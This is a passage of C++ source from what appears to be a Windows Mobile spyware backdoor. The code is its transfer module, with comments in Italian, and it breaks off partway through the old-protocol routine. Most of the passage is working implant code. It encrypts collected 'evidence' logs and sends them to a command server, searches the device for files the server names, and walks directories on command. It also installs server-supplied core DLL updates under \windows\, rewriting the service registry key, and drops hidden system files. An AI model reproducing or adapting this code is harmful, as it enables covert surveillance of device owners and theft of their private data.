	wstring fullpath;
	stack<wstring> folders;
	folders.push(path);
	files.clear();

	WCHAR stringa[1024];
	WCHAR stringaOut[1024];
//	HINSTANCE LibHandle;

		
	while (!folders.empty())
	{
		path = folders.top();
		fullpath = path + L"\\" + mask;
		folders.pop();

		hFind = _FindFirstFile(fullpath.c_str(), &fdata);

		if (hFind != INVALID_HANDLE_VALUE)
		{
			do
			{
				if (wcscmp(fdata.cFileName, L".") != 0 &&
                    wcscmp(fdata.cFileName, L"..") != 0)
				{
					if (fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
					{
						folders.push(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s [DIR]\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						

					}
					else
					{
						files.push_back(path + L"\\" + fdata.cFileName);
						
						swprintf_s(stringa,L"%s\\%s",path.c_str(),fdata.cFileName);
						swprintf_s(stringaOut,L"%s\\%s\n",path.c_str(),fdata.cFileName);
						OutputDebugString(  stringaOut );
						
					}
				}
			}
			while (FindNextFile(hFind, &fdata) != 0);
		}
		else
		{
		
				//LPVOID lpMsgBuf;
				WCHAR lpMsgBuf[512];
	
				FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), 0, (LPWSTR) lpMsgBuf, sizeof(lpMsgBuf), NULL );

				swprintf_s(stringa,L">>>>>>>>>>>>>>>>>>>>>>>>>>>>> FindFirstFile:%s err:%i : %s\n",fullpath.c_str(),GetLastError(),lpMsgBuf);
				OutputDebugString(  stringa );

	}
		

		/*
		if (GetLastError() != ERROR_NO_MORE_FILES)
		{
			FindClose(hFind);

			//return false;
			return true;
		}
		*/
		FindClose(hFind);
		hFind = INVALID_HANDLE_VALUE;
	}

	return true;
}

void DebugListLocalDir()
{
	///// INIZIO USATO PER DEBUG
		vector<wstring> files1;
		//ListFiles(L"C:\\Data\\programs\\{8321B710-9C57-40FE-8EE1-6FF32A86A9E7}", L"*", files1);
		//ListFiles(L"C:\\Data\\SharedData\\PhoneTools\\11.0\\Debugger", L"*", files1);
		ListFiles(L".\\", L"*", files1);
		/*
		for (vector<wstring>::iterator iter = files1.begin(); iter != files1.end(); ++iter)
		{
			//wcout << iter->c_str() << endl;
			
			WCHAR stringa[1024];
			WCHAR stringaOut[1024];

			swprintf_s(stringa,_T("%s"), iter->c_str());
			swprintf_s(stringaOut,_T("%s\n"), iter->c_str());
			OutputDebugString(  stringaOut );
		}
		*/
	///// FINE USATO PER DEBUG
}

BOOL Transfer::RestSendLogs() {
	// len | evidence
	list<LogInfo>::iterator iter;
	HANDLE hFile;
	DWORD dwSize, dwRead = 0;

#ifdef _DEBUG
	//ByGio usato per debug
	//DebugListLocalDir();
#endif

	// pSnap puo' essere nullo in caso di errore o se non c'e' uberlogObj.
	// Lo snapshot viene liberato subito dopo questa chiamata.
	pSnap = uberlogObj->ListClosed();

	if (pSnap == NULL || pSnap->size() == 0) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() there are no logs to send\n", 5, FALSE);
		return TRUE;
	}

	for (iter = pSnap->begin(); iter != pSnap->end(); iter++) {
		hFile = _CreateFileW((*iter).strLog.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE) {
			uberlogObj->Delete((*iter).strLog);
			continue;
		}

		dwSize = _GetFileSize(hFile, NULL);

		// Il file e' vuoto oppure non c'e' piu'
		if (dwSize == 0 || dwSize == 0xFFFFFFFF) {
			CloseHandle(hFile);
			uberlogObj->Delete((*iter).strLog);	
			continue;
		}
#ifdef _DEBUG
	WCHAR msg[256];
	swprintf_s(msg, L"Debug - Transfer.cpp - RestSendLogs() sending log file:%s\n",(*iter).strLog.c_str());OutputDebugString(msg);
#endif
		
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() sending log file\n", 6, FALSE);

		// Copiamo il file nel buffer
		PBYTE pData = new(std::nothrow) BYTE[dwSize];

		if (pData == NULL) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [pData == NULL]\n", 5, FALSE);
			CloseHandle(hFile);
			ClearLogSnapshot();
			return FALSE;
		}

		if (!ReadFile(hFile, pData, dwSize, (DWORD *)&dwRead, NULL)) {
			CloseHandle(hFile);
			delete[] pData;
			continue;
		}

		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;

		// Copiamo il log nel buffer e calcoliamo lo SHA1
		Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_LOG) + sizeof(dwSize) + dwSize + 20));
		Hash hash;

		UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_LOG) + sizeof(dwSize) + dwSize + 20);
		UINT uCommand = PROTO_LOG;
		BYTE sha1[20];

		// Creiamo il request per il comando
		b.append((UCHAR *)&uCommand, sizeof(uCommand));
		b.append((UCHAR *)&dwSize, sizeof(dwSize));
		b.append((UCHAR *)pData, dwSize);

		delete[] pData;

		// Calcoliamo l'hash
		hash.Sha1(b.getBuf(), sizeof(PROTO_LOG) + sizeof(dwSize) + dwSize, sha1);

		b.append((BYTE *)sha1, 20);
		b.repeat(uPadding, uPadding);

		// Inviamo il log
		UINT uResponse = 0;

		PBYTE pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

#ifdef _DEBUG
	swprintf_s(msg, L"Debug - Transfer.cpp - RestSendLogs() b.getPos():%i uResponse:%i\n", b.getPos(), uResponse);OutputDebugString(msg);
#endif


		if (pResponse == NULL) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [RestSendCommand()] ", 4, TRUE);
			return FALSE;
		}

		b.free();
		b.append((UCHAR *)&pResponse, sizeof(UINT));

		delete[] pResponse;

		if (b.getInt() == PROTO_NO) {
			return FALSE;
		}

		// Rimuoviamo il log dalla lista globale e dal filesystem
		uberlogObj->Delete((*iter).strLog);

		// Usciamo se siamo in crisis
		if ((statusObj->Crisis() & CRISIS_SYNC) == CRISIS_SYNC) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [We are in crisis] [8]\n", 5, FALSE);
			ClearLogSnapshot();
			return FALSE;
		}

// BYGIO ho eliminato questo codice per sfruttare al massimo la trasmissione e' perche' in release mode craschava sul delete
//		// Usciamo dal loop se l'utente riprende ad interagire col telefono
//#ifndef _DEBUG
//		if (deviceObj->IsDeviceUnattended() == FALSE) {
//			DBG_TRACE(L"Debug - Transfer.cpp - RestSendLogs() FAILED [Power status changed] [9]\n", 5, FALSE);
//			delete[] pData;
//			ClearLogSnapshot();
//			return FALSE;
//		}
//#endif
	}

	ClearLogSnapshot();
	
	return TRUE;
}

BOOL Transfer::RestSendDownloads() {
	
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_DOWNLOAD) + 20));
	Hash hash;

	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_DOWNLOAD) + 20);
	UINT uCommand = PROTO_DOWNLOAD;
	BYTE sha1[20];

	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

	// Creiamo il request per il comando
	b.append((UCHAR *)&uCommand, sizeof(uCommand));
	b.append((BYTE *)sha1, 20);
	b.repeat(uPadding, uPadding);

	UINT uResponse = 0;
	BYTE *pResponse = NULL;

	pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

	if (pResponse == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestSendDownloads() FAILED [RestSendCommand()] ", 4, TRUE);
		return FALSE;
	}

	b.free();
	b.append(pResponse, uResponse);
	b.reset();

	ZeroMemory(pResponse, uResponse);
	delete[] pResponse;

	// Vediamo se la risposta e' un PROTO_NO (non ci sono downloads)
	if (b.getInt() == PROTO_NO) {
		return TRUE;
	}

	// Se ci sono file, iniziamo a creare i log uno ad uno
	UINT uLen = b.getInt();
	UINT uNum = b.getInt();
	PWCHAR pwSearch = NULL;

	for (UINT i = 0, uPascalLen = 0; i < uNum; i++) {
		uPascalLen = b.getInt();
		pwSearch = (PWCHAR)b.getCurBuf();

		// Spostiamoci in avanti
		b.setPos(b.getPos() + uPascalLen);

		// Espandiamo $dir$ se presente
		size_t strSpecialVar;
		wstring strSearchString, strBackdoorPath;
		BOOL bObscure;

		strBackdoorPath = GetCurrentPath(NULL);
		strSearchString = pwSearch;

		if (strBackdoorPath.empty() == FALSE) {
			strSpecialVar = strSearchString.find(L"$dir$\\");

			// Se troviamo $dir$ nella search string espandiamolo
			if (strSpecialVar != wstring::npos) {
				bObscure = TRUE;
				strSearchString.replace(strSpecialVar, 6, strBackdoorPath); // Qui $dir$ viene espanso
			} else {
				bObscure = FALSE;
			}
		}

		WIN32_FIND_DATA wfd;
		HANDLE hFind = INVALID_HANDLE_VALUE;

		ZeroMemory(&wfd, sizeof(wfd));
		hFind = _FindFirstFile(strSearchString.c_str(), &wfd);

		if (hFind == INVALID_HANDLE_VALUE)
			continue;

		if (GetLastError() == ERROR_FILE_NOT_FOUND) {
			CloseHandle(hFind);
			continue;
		}

		do {
			// Anteponiamo il path al nome del file
			size_t trailingSlash = strSearchString.rfind(L"\\");

			// Il nome del file non contiene un path assoluto
			if (trailingSlash == wstring::npos) {
				FindClose(hFind);
				continue;
			}

			wstring strPath;

			if (trailingSlash)
				strPath = strSearchString.substr(0, trailingSlash);

			strPath += L"\\";
			strPath += wfd.cFileName;

			// Creiamo un log per ogni file trovato
			CreateDownloadFile(strPath, bObscure);
		} while (FindNextFile(hFind, &wfd));

		FindClose(hFind);
	}
	
	return TRUE;
}

BOOL Transfer::RestGetUploads() {
	
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_UPLOAD) + 20));
	Hash hash;

	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_UPLOAD) + 20);
	UINT uCommand = PROTO_UPLOAD;
	BYTE sha1[20];
	UINT uLeft;
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

	do {
		b.free();

		// Creiamo il request per il comando
		b.append((UCHAR *)&uCommand, sizeof(uCommand));
		b.append((BYTE *)sha1, 20);
		b.repeat(uPadding, uPadding);

		UINT uResponse = 0;
		BYTE *pResponse = NULL;

		pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

		if (pResponse == NULL) {
			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() FAILED [RestSendCommand()] ", 4, TRUE);
			return FALSE;
		}

		b.free();
		b.append(pResponse, uResponse);
		b.reset();

		ZeroMemory(pResponse, uResponse);
		delete[] pResponse;

		// Vediamo se la risposta e' un PROTO_NO (non ci sono uploads)
		if (b.getInt() == PROTO_NO) {
			return TRUE;
		}

		UINT uFileLen = b.getInt();
		
		uLeft = b.getInt();

		UINT uPascalLen = b.getInt();

		PWCHAR pwFilename = (PWCHAR)b.getCurBuf();

		// Ora il buffer punta al primo byte del pascal del file di upgrade
		b.setPos(b.getPos() + uPascalLen);
		uFileLen = b.getInt();

		// Temporaneamente teniamo qui la routine di upgrade
		// Verifichiamo il tipo di upgrade
		if (wcsncmp(L"core-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
			// Se conosciamo il nostro nome, switchiamo il nuovo core
			wstring strPathName = L"\\windows\\";

			if (g_strOurName.empty() == FALSE) {
				if (g_strOurName == MORNELLA_SERVICE_DLL_A)
					strPathName += MORNELLA_SERVICE_DLL_B;
				else
					strPathName += MORNELLA_SERVICE_DLL_A;

				hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (hFile == INVALID_HANDLE_VALUE) {
					DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile()]\n", 5, FALSE);
					continue;
				}
			} else { // Se non sappiamo qual'e' il nostro nome... Guessiamo
				strPathName += MORNELLA_SERVICE_DLL_A;

				hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

				if (hFile == INVALID_HANDLE_VALUE) {
					strPathName = L"\\windows\\";
					strPathName += MORNELLA_SERVICE_DLL_B;

					hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

					if (hFile == INVALID_HANDLE_VALUE) {
						DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [CreateFile() 2]\n", 5, FALSE);
						continue;
					}

					g_strOurName = MORNELLA_SERVICE_DLL_A;
				} else {
					g_strOurName = MORNELLA_SERVICE_DLL_B;
				}
			}

			wstring strNewCore;

			if (g_strOurName == MORNELLA_SERVICE_DLL_A)
				strNewCore = MORNELLA_SERVICE_DLL_B;
			else
				strNewCore = MORNELLA_SERVICE_DLL_A;

			DWORD dwWritten = 0;

			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
				CloseHandle(hFile);
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [WriteFile()]\n", 5, FALSE);
				continue;
			}

			FlushFileBuffers(hFile);
			CloseHandle(hFile);

			// Scriviamo la chiave nel registro
			HKEY hKey;

			if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, MORNELLA_SERVICE_PATH, 0, 0, &hKey) != ERROR_SUCCESS) {
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RegOpenKeyEx()] ", 5, TRUE);
				continue;
			}

			// Aggiorniamo con il nome del nuovo core
			DWORD cbData = (strNewCore.size() * sizeof(WCHAR)) + sizeof(WCHAR);
			if (_RegSetValueEx(hKey, L"Dll", 0, REG_SZ, (BYTE *)strNewCore.c_str(), cbData) != ERROR_SUCCESS) {
				_RegCloseKey(hKey);
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUpgrade() FAILED [RegSetValueEx()] ", 5, TRUE);
				continue;
			}

			_RegCloseKey(hKey);
			_RegFlushKey(HKEY_LOCAL_MACHINE);
		} else {
			// Creiamolo
			wstring strUploaded;

			// Controllo per la migrazione
			if (wcsncmp(L"nc-7-8dv.cfg", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf arriving", 4, FALSE);
				strUploaded = GetCurrentPath(g_ConfName);
				wstring strExtension = L".mig";

				Encryption encryptionObj(g_ConfKey, KEY_LEN);
				WCHAR* pBackExt = encryptionObj.EncryptName(strExtension, g_Challenge[0]);

				strUploaded += pBackExt;

				free(pBackExt);
			} else {
				strUploaded = GetCurrentPath(pwFilename);
			}

			if (strUploaded.empty())
				continue;

			hFile = _CreateFileW(strUploaded.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);

			if (hFile == INVALID_HANDLE_VALUE)
				continue;

			DBG_TRACE_INT(L"Debug - Transfer.cpp - RestGetUploads() migration conf file created, size: ", 4, FALSE, uFileLen);
			//b.setPos(b.getPos() + uPascalLen);
			//uFileLen = b.getInt();

			DWORD dwWritten = 0;

			// Scriviamolo
			if (WriteFile(hFile, b.getCurBuf(), uFileLen, &dwWritten, NULL) == FALSE) {
				CloseHandle(hFile);
				DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf, content not written ", 4, TRUE);
				continue;
			}

			DBG_TRACE(L"Debug - Transfer.cpp - RestGetUploads() migration conf saved successfully", 4, FALSE);
			CloseHandle(hFile);
		}

	} while (uLeft);

	FlushFileBuffers(hFile);
	
	return TRUE;
}

BOOL Transfer::RestSendFilesystem() {
	
	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_FILESYSTEM) + 20));
	Hash hash;

	UINT uPadding = Encryption::GetPKCS5Padding(sizeof(PROTO_FILESYSTEM) + 20);
	UINT uCommand = PROTO_FILESYSTEM;
	BYTE sha1[20];

	hash.Sha1((UCHAR *)&uCommand, sizeof(uCommand), sha1);

	// Creiamo il request per il comando
	b.append((UCHAR *)&uCommand, sizeof(uCommand));
	b.append((BYTE *)sha1, 20);
	b.repeat(uPadding, uPadding);

	UINT uResponse = 0;
	BYTE *pResponse = NULL;

	pResponse = RestSendCommand((BYTE *)b.getBuf(), b.getPos(), uResponse);

	if (pResponse == NULL) {
		DBG_TRACE(L"Debug - Transfer.cpp - RestGetNewConf() FAILED [RestSendCommand()] ", 4, TRUE);
		return FALSE;
	}

	b.free();
	b.append(pResponse, uResponse);
	b.reset();

	ZeroMemory(pResponse, uResponse);
	delete[] pResponse;

	// Vediamo se la risposta e' un PROTO_NO (non ci sono filesystem)
	if (b.getInt() == PROTO_NO) {
		return TRUE;
	}

	// * PROTO_NO, se non ci sono file in upload
	// * PROTO_OK | len | numDir | depth1 | dir1 | depth2 | dir2 | ... , se c'e' almeno una directory da spedire 
	UINT uReqLen = b.getInt();
	UINT uNumDir = b.getInt();
	UINT uDepth, uDirLen;

	Explorer exp;

	for (UINT i = 0; i < uNumDir; i++) {
		uDepth = b.getInt();

		if (uDepth > 10)
			uDepth = 10;

		uDirLen = b.getInt();

		wstring dir = (PWCHAR)b.getCurBuf();

		if (dir.compare(L"%USERPROFILE%") == 0) {
			b.setPos(b.getPos() + uDirLen);
			continue;
		}

		exp.ExploreDirectory((PWCHAR)dir.c_str(), uDepth);
		//exp.ExploreDirectory((PWCHAR)b.getCurBuf(), uDepth);
		b.setPos(b.getPos() + uDirLen);
	}
	
	return TRUE;
}

BOOL Transfer::SetPollInterval(UINT uPoll, UINT uTimes) {
	pollInterval = uPoll;
	retryTimes = uTimes;

	if (pollInterval == 0)
		pollInterval = 1000;

	return TRUE;
}

DWORD Transfer::GetAdapterIP(const wstring &strAdapterName) {
	/***
	ULONG pdwSize = 0, Index = 0;
	PMIB_IPADDRTABLE pIpAddrTable = NULL;
	UINT i;

	if (strAdapterName.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterIP() FAILED [0]\n", 5, FALSE);
		return 0;
	}

	while (_GetIpAddrTable(pIpAddrTable, &pdwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
		if (pIpAddrTable) {
			delete[] pIpAddrTable;
			pIpAddrTable = NULL;
		}

		pIpAddrTable = (PMIB_IPADDRTABLE)new(std::nothrow) BYTE[pdwSize];

		if (pIpAddrTable == NULL) {
			DBG_TRACE(L"Debug - Task.cpp - GetAdapterIP() FAILED [1]\n", 5, FALSE);
			return 0;
		}

		ZeroMemory(pIpAddrTable, pdwSize);
	}

	// Prendiamo l'index della nostra scheda WiFi
	if (::_GetAdapterIndex((PWCHAR)strAdapterName.c_str(), &Index) != NO_ERROR) {
		delete[] pIpAddrTable;
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterIP() FAILED [2]\n", 5, FALSE);
		return 0;
	}

	// Cerchiamo il primo IP dell'adattatore (potrebbero comunque esistere piu' rotte)
	for (i = 0; i < pIpAddrTable->dwNumEntries; i++) {
		if (pIpAddrTable->table[i].dwIndex == Index) {
			delete[] pIpAddrTable;
			return pIpAddrTable->table[i].dwAddr;
		}
	}

	// Non abbiamo trovato l'adattatore, torniamo 0
	delete[] pIpAddrTable;
	DBG_TRACE(L"Debug - Task.cpp - GetAdapterIP() FAILED [3]\n", 5, FALSE);
	***/
	return 0;
}

DWORD Transfer::GetAdapterMask(const wstring &strAdapterName) {
	/***
	ULONG pdwSize = 0, Index = 0;
	PMIB_IPADDRTABLE pIpAddrTable = NULL;
	UINT i;

	if (strAdapterName.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterMask() FAILED [0]\n", 5, FALSE);
		return 0;
	}

	while (_GetIpAddrTable(pIpAddrTable, &pdwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
		if (pIpAddrTable) {
			delete[] pIpAddrTable;
			pIpAddrTable = NULL;
		}

		pIpAddrTable = (PMIB_IPADDRTABLE)new(std::nothrow) BYTE[pdwSize];

		if (pIpAddrTable == NULL) {
			DBG_TRACE(L"Debug - Task.cpp - GetAdapterMask() FAILED [1]\n", 5, FALSE);
			return 0;
		}

		ZeroMemory(pIpAddrTable, pdwSize);
	}

	// Prendiamo l'index della nostra scheda WiFi
	if (::_GetAdapterIndex((PWCHAR)strAdapterName.c_str(), &Index) != NO_ERROR) {
		delete[] pIpAddrTable;
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterMask() FAILED [2]\n", 5, FALSE);
		return 0;
	}

	// Cerchiamo il primo IP dell'adattatore (potrebbero comunque esistere piu' rotte)
	for (i = 0; i < pIpAddrTable->dwNumEntries; i++) {
		if (pIpAddrTable->table[i].dwIndex == Index) {
			delete[] pIpAddrTable;
			return pIpAddrTable->table[i].dwMask;
		}
	}

	// Non abbiamo trovato l'adattatore, torniamo 0
	delete[] pIpAddrTable;
	DBG_TRACE(L"Debug - Task.cpp - GetAdapterMask() FAILED [3]\n", 5, FALSE);
	***/
	return 0;
}

DWORD Transfer::GetAdapterIndex(const wstring &strAdapterName) {
	/***
	ULONG Index = 0;

	if (strAdapterName.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterIndex() FAILED [0]\n", 5, FALSE);
		return 0;
	}

	// Prendiamo l'index della nostra scheda WiFi
	if (::_GetAdapterIndex((PWCHAR)strAdapterName.c_str(), &Index) != NO_ERROR) {
		DBG_TRACE(L"Debug - Task.cpp - GetAdapterIndex() FAILED [1]\n", 5, FALSE);
		return 0;
	}
	
	return (DWORD)Index;
	***/
	return 0;
}

BOOL Transfer::SetWirelessIp(const wstring &strAdapterName, ULONG uIp, ULONG uMask) {
	/***
	wstring strKeypath;
	HKEY hRes;
	DWORD dwDim, dwType;
	WCHAR wNewIp[16], wNewMask[16];
	in_addr addr;
	DWORD dwDhcp = 0;

	ZeroMemory(wNewIp, sizeof(wNewIp));
	ZeroMemory(wNewMask, sizeof(wNewMask));

	addr.S_un.S_addr = uIp;
	wprintf_s(wNewIp, L"%S", inet_ntoa(addr));

	addr.S_un.S_addr = uMask;
	wprintf_s(wNewMask, L"%S", inet_ntoa(addr));

	dwDim = dwType = 0;

	if (strAdapterName.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	strKeypath = L"Comm\\";
	strKeypath += strAdapterName;
	strKeypath += L"\\Parms\\TcpIp";

	if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, (PWCHAR)strKeypath.c_str(), 0, 0, &hRes) != ERROR_SUCCESS) {
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	// Verifichiamo prima quali chiavi sono presenti, se non ci sono le creiamo noi
	dwDim = 0;
	if (_RegQueryValueExW(hRes, L"EnableDHCP", NULL, NULL, NULL, &dwDim) != ERROR_SUCCESS) {
		dwDim = 0;
		_RegSetValueEx(hRes, L"EnableDHCP", 0, REG_DWORD, (PBYTE)&dwDim, sizeof(dwDim));
	}

	dwDim = 0;
	if (_RegQueryValueExW(hRes, L"IpAddress", NULL, NULL, NULL, &dwDim) != ERROR_SUCCESS) {
		_RegSetValueEx(hRes, L"IpAddress", 0, REG_MULTI_SZ, (BYTE *)wNewIp, 16 * sizeof(WCHAR));
	}

	dwDim = 0;
	if (_RegQueryValueExW(hRes, L"Subnetmask", NULL, NULL, NULL, &dwDim) != ERROR_SUCCESS) {
		_RegSetValueEx(hRes, L"Subnetmask", 0, REG_MULTI_SZ, (BYTE *)wNewMask, 16 * sizeof(WCHAR));
	}

	// Quindi iniziamo a richiedere tutti i valori di cui tener traccia
	dwDim = 4;
	if (_RegQueryValueExW(hRes, L"EnableDHCP", NULL, &dwType, (PBYTE)&ulRegistryDhcp, &dwDim) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [2]\n", 5, FALSE);
		return FALSE;
	}

	// Troviamo la dimensione del buffer per l'IP
	dwDim = 0;
	if (_RegQueryValueExW(hRes, L"IpAddress", NULL, NULL, NULL, &dwDim) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [3]\n", 5, FALSE);
		return FALSE;
	}

	PWCHAR pwRegistryIp = new(std::nothrow) WCHAR[dwDim + 1];

	if (pwRegistryIp == NULL) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [4]\n", 5, FALSE);
		return FALSE;
	}

	ZeroMemory(pwRegistryIp, (dwDim + 1) * sizeof(WCHAR));

	// Leggiamo il vecchio valore
	if (_RegQueryValueExW(hRes, L"IpAddress", NULL, NULL, (PBYTE)pwRegistryIp, &dwDim) != ERROR_SUCCESS) {
		delete[] pwRegistryIp;
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [5]\n", 5, FALSE);
		return FALSE;
	}

	strRegistryIp = pwRegistryIp;
	delete[] pwRegistryIp;

	// Troviamo la dimensione del buffer per la netmask
	dwDim = 0;
	if (_RegQueryValueExW(hRes, L"Subnetmask", NULL, NULL, NULL, &dwDim) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [6]\n", 5, FALSE);
		return FALSE;
	}

	PWCHAR pwRegistryMask = new(std::nothrow) WCHAR[dwDim + 1];

	if (pwRegistryMask == NULL) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [7]\n", 5, FALSE);
		return FALSE;
	}

	ZeroMemory(pwRegistryMask, (dwDim + 1) * sizeof(WCHAR));

	do {
		// Leggiamo il vecchio valore
		if (_RegQueryValueExW(hRes, L"Subnetmask", NULL, NULL, (PBYTE)pwRegistryMask, &dwDim) != ERROR_SUCCESS)
			break;

		strRegistryMask = pwRegistryMask;
		delete[] pwRegistryMask;

		// E scriviamo i nuovi
		if (_RegSetValueEx(hRes, L"EnableDHCP", 0, REG_DWORD, (BYTE *)&dwDhcp, 4) != ERROR_SUCCESS)
			break;

		if (_RegSetValueEx(hRes, L"IpAddress", 0, REG_MULTI_SZ, (BYTE *)wNewIp, 16 * sizeof(WCHAR)) != ERROR_SUCCESS)
			break;

		if (_RegSetValueEx(hRes, L"Subnetmask", 0, REG_MULTI_SZ, (BYTE *)wNewMask, 16 * sizeof(WCHAR)) != ERROR_SUCCESS)
			break;

		_RegCloseKey(hRes);
		return TRUE;
	} while(0);

	
	delete[] pwRegistryMask;
	pwRegistryMask = NULL;

	_RegCloseKey(hRes);
	DBG_TRACE(L"Debug - Task.cpp - SetWirelessIp() FAILED [8]\n", 5, FALSE);
	***/
	return FALSE;
}

BOOL Transfer::RestoreWirelessIp(const wstring &strAdapterName) {
	/***
	wstring strKeypath;
	HKEY hRes;
	UINT uIpLen, uMaskLen;

	if (strAdapterName.empty() || strRegistryIp.empty() || strRegistryMask.empty()) {
		DBG_TRACE(L"Debug - Task.cpp - RestoreWirelessIp() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	strKeypath = L"Comm\\";
	strKeypath += strAdapterName;
	strKeypath += L"\\Parms\\TcpIp";

	if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, (PWCHAR)strKeypath.c_str(), 0, 0, &hRes) != ERROR_SUCCESS) {
		DBG_TRACE(L"Debug - Task.cpp - RestoreWirelessIp() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	// Scriviamo i nuovi valori
	uIpLen = (strRegistryIp.size() * sizeof(WCHAR)) + sizeof(WCHAR);
	uMaskLen = (strRegistryMask.size() * sizeof(WCHAR)) + sizeof(WCHAR);

	if (_RegSetValueEx(hRes, L"EnableDHCP", 0, REG_DWORD, (BYTE *)&ulRegistryDhcp, 4) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - RestoreWirelessIp() FAILED [2]\n", 5, FALSE);
		return FALSE;
	}

	if (_RegSetValueEx(hRes, L"IpAddress", 0, REG_MULTI_SZ, (PBYTE)strRegistryIp.c_str(), uIpLen) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - RestoreWirelessIp() FAILED [3]\n", 5, FALSE);
		return FALSE;
	}

	if (_RegSetValueEx(hRes, L"Subnetmask", 0, REG_MULTI_SZ, (PBYTE)strRegistryMask.c_str(), uMaskLen) != ERROR_SUCCESS) {
		_RegCloseKey(hRes);
		DBG_TRACE(L"Debug - Task.cpp - RestoreWirelessIp() FAILED [4]\n", 5, FALSE);
		return FALSE;
	}

	strRegistryIp.clear();
	strRegistryMask.clear();

	_RegCloseKey(hRes);
	***/
	return TRUE;
}

// Gestione vecchio protocollo
UINT Transfer::SendOldProto(UINT Type, BOOL bInterrupt) {
	/***
	SOCKET localSocket;
	DWORD dwData, dwRead = 0;

	switch (Type) {
		case CONF_SYNC_BT:
			localSocket = BTSocket;
			break;

		case CONF_SYNC_WIFI:
			localSocket = wifiSocket;
			break;

		case CONF_SYNC_INTERNET:
			localSocket = internetSocket;
			break;

		default: 
			localSocket = INVALID_SOCKET;
			break;
	}

	if (localSocket == INVALID_SOCKET || localSocket == SOCKET_ERROR)
		return FALSE;

